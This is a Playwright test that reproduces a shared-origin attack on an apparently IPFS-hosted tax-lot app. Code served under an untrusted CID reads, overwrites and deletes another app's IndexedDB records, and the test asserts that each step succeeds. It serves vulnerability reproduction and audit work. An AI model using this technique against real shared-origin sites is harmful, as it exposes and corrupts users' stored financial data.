import { test, expect } from "@playwright/test";
test("shared-origin attack reads, poisons and deletes events raw and meta", async ({
  page,
}) => {
  await page.route("**/ipfs/**", (route) =>
    route.fulfill({
      contentType: "text/html",
      body: "<!doctype html><title>Shared origin attack fixture</title>",
    }),
  );
  await page.goto("/ipfs/pit-audit-cid/");
  await page.evaluate(
    async () =>
      new Promise<void>((resolve, reject) => {
        const req = indexedDB.open("pit-taxlot-v1", 1);
        req.onerror = () => reject(req.error);
        req.onupgradeneeded = () => {
          for (const name of ["events", "raw", "meta"])
            req.result.createObjectStore(name);
        };
        req.onsuccess = () => {
          const db = req.result;
          const tx = db.transaction(["events", "raw", "meta"], "readwrite");
          tx.objectStore("events").put(
            { account: "fixture", quantity: "1" },
            "record",
          );
          tx.objectStore("raw").put({ fill: "original" }, "record");
          tx.objectStore("meta").put(1, "sequence");
          tx.oncomplete = () => {
            db.close();
            resolve();
          };
        };
      }),
  );
  await page.goto("/ipfs/untrusted-audit-cid/");
  const result = await page.evaluate(async () => {
    const db = await new Promise<IDBDatabase>((resolve, reject) => {
      const r = indexedDB.open("pit-taxlot-v1", 1);
      r.onsuccess = () => resolve(r.result);
      r.onerror = () => reject(r.error);
    });
    const read = async (store: string, key: string) =>
      new Promise<any>((resolve) => {
        const r = db.transaction(store).objectStore(store).get(key);
        r.onsuccess = () => resolve(r.result);
      });
    const stolen = {
      event: await read("events", "record"),
      raw: await read("raw", "record"),
      sequence: await read("meta", "sequence"),
    };
    await new Promise<void>((resolve) => {
      const tx = db.transaction(["events", "raw", "meta"], "readwrite");
      tx.objectStore("events").put(
        { account: "fixture", quantity: "999" },
        "record",
      );
      tx.objectStore("raw").delete("record");
      tx.objectStore("meta").put(999, "sequence");
      tx.oncomplete = () => resolve();
    });
    const poisoned = await read("events", "record"),
      deleted = await read("raw", "record"),
      sequence = await read("meta", "sequence");
    db.close();
    return {
      stolen,
      poisoned,
      deleted: deleted === undefined,
      sequence,
      origin: location.origin,
    };
  });
  expect(result.stolen).toEqual({
    event: { account: "fixture", quantity: "1" },
    raw: { fill: "original" },
    sequence: 1,
  });
  expect(result.poisoned.quantity).toBe("999");
  expect(result.deleted).toBe(true);
  expect(result.sequence).toBe(999);
  console.log("Attack reproduction: " + JSON.stringify(result));
});
